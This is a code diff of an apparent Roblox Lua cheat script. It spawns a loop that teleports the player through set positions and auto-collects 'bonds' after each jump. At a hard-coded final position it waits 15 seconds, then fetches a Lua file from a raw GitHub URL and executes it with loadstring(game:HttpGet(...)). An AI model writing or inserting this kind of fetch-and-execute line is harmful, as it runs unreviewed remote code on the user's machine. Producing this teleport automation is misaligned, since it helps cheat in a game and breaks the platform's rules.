@@ -129,12 +129,27 @@ local function collectAllBonds()
 end
 
 
+task.spawn(function()
+    for _, pos in ipairs(positions) do
+        safeTeleport(pos)
+        task.wait(duration)
+
+        -- ✅ **Collect Bonds after every teleport**
+        collectAllBonds()
+        updateBondCount()
+
+        -- ✅ **Execute loadstring after reaching final position**
         if pos == Vector3.new(-423, 3, -49029) then
-            print("Reached final position, waiting 15 seconds...")
-            task.wait(15)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
-            print("Executed loadstring after 15 seconds.")
+            task.spawn(function()
+                print("Reached final position, waiting 15 seconds before executing loadstring...")
+                task.wait(15)
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
+                print("Executed loadstring after 15 seconds.")
+            end)
         end
+    end
+end)
+
 
 collectAllBonds()
 updateBondCount()
